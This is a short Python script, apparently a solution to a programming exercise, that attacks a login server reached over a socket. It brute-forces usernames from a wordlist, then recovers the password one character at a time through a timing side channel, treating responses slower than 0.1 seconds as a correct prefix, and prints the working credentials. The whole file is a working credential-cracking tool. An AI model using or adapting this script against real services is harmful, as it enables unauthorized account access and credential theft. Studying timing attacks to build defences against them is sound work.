# write your code here
import os
import sys
import json
import time
import string
import socket
import itertools

login_path = "logins.txt"
pass_path = "passwords.txt"

ip = sys.argv[1]
port = int(sys.argv[2])

soc = socket.socket()
soc.connect((ip, port))

def reading_file(path_):
    f = open(path_, 'r')
    logins_ = f.read().split("\n")
    return logins_

def send_receive(socket_, msg_):
    data = json.dumps(msg_, indent=4).encode()
    socket_.send(data)
    response = socket_.recv(1024)
    response_py = json.loads(response.decode())
    return response_py

logins = reading_file(login_path)

status = False

good_id = ''
mmap = {}

for line in logins:
    mmap = {"login": line, "password": " "}
    login_status = send_receive(soc, mmap)
    if login_status != {"result": "Wrong login!"}:
        good_id = ''.join(line)


chars = string.ascii_letters + string.digits
good_pw = ''
pass_status = {}

while True:  # pass_status != {"result": "Connection success!"}:
    for i in chars:
        mmap = {"login": good_id, "password": good_pw + i}
        start = time.time()
        pass_status = send_receive(soc, mmap)
        end = time.time()
        if pass_status == {"result": "Connection success!"}:
            good_pw += i
            print(json.dumps(mmap, indent=4))
            status = True
            break
        elif end - start > 0.1:
            good_pw += i
            break
    if status == True:
        break

soc.close()
